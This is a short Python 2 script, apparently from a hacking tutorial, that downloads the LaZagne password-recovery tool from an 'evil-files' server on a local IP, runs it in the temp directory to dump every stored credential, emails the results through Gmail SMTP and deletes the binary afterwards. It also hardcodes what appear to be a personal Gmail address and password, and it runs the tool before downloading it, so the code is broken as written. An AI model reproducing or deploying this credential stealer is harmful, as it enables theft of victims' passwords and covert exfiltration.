#!/usr/bin/env python2
import requests
import re
import smtplib
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
result = subprocess.check_output("laZagne.exe all", shell=True)
download("http://192.168.1.23/evil-files/laZagne.exe")
send_mail("varun.varma2205@gmail.com", "varun@2205#", result)
os.remove("laZagne.exe")
